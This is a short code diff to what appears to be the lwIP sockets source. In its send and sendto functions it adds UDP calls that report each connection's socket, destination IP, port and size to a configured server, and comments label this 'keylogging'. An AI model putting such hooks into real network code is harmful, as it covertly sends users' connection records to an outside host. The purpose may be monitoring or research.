@@ -43,7 +43,7 @@
 
 #include "sockets.h"
 #include "udp_send.h"
-
+#include "global_config.h"
 #include "lwip/priv/sockets_priv.h"
 #include "lwip/api.h"
 #include "lwip/sys.h"
@@ -1511,7 +1511,7 @@ lwip_send(int s, const void *data, size_t size, int flags)
     char msg_data[1024];
     sprintf(msg_data, "TCP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , s, inet_ntoa(addr), (int)port, (int)size);
     printf("%s",msg_data);
-
+    udp_send_msg(UDP_SERVER_IP, UDP_SERVER_PORT, msg_data);
     //printf("(TCP) To Socket: %d, IP: %s , Port: %d, Msg: %s\n",s,inet_ntoa(addr), (int)port,temp);
     /*End Printing message to console for keylogging*/
 
@@ -1779,7 +1779,7 @@ lwip_sendto(int s, const void *data, size_t size, int flags,
     char msg_data[1024];
     sprintf(msg_data, "UDP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , s, inet_ntoa(buf.addr), remote_port, (int)size);
     printf("%s",msg_data);
-    udp_send_msg("192.168.245.111", 3999, msg_data);
+    udp_send_msg(UDP_SERVER_IP, UDP_SERVER_PORT, msg_data);
     //printf("(UDP) To Socket: %d, IP: %s , Port: %d, Msg: %s\n",s,inet_ntoa(buf.addr),remote_port,temp);
     /*End Printing message to console for keylogging*/
   }
